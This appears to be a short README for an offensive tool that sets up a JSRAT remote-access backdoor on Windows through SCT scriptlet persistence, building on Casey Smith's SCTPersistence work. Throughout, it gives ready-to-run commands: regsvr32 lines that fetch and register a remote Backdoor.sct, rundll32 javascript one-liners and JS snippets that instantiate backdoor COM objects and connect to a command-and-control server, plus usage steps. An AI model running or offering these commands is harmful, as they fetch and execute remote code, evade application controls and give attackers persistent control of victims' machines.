Another way of JSRAT on SCTPersistence.
---

Thanks to Casey Smith@subTee

https://github.com/subTee/SCTPersistence


His Way:
1.On host, execute regsvr32.exe /s /i:http://server/Backdoor.sct scrobj.dll
-The default is to use the path to a local file
-rewrite the regkey
-the Class definition comes form the interwebs http://server/c2.js
2.c2.js
-javascript payload
-.sct format
3.call the COM Object
-cmd
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();
or`
-js
`var x = new ActiveXObject("Component.Backdoor");
x.Main();
var x = new ActiveXObject("Component.Backdoor");
x.Exec();`

My Way:
1.On host, execute regsvr32.exe /s /i:http://server/Backdoor.sct scrobj.dll
-The default is to use the path to a local file
-Connect to the JSRAT server
2.call the COM Object
-cmd
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Empire");x.Exec();`
-js
`var ref = new ActiveXObject("JSRAT");
ref.Exec();`




---
###Usage:

1.(local)


`regsvr32.exe /s /i:Backdoor.sct scrobj.dll`


or (remote)


`regsvr32.exe /s /i:http://example/Backdoor.sct scrobj.dll`


2.run BackdoorTest.js to start JSRAT

 













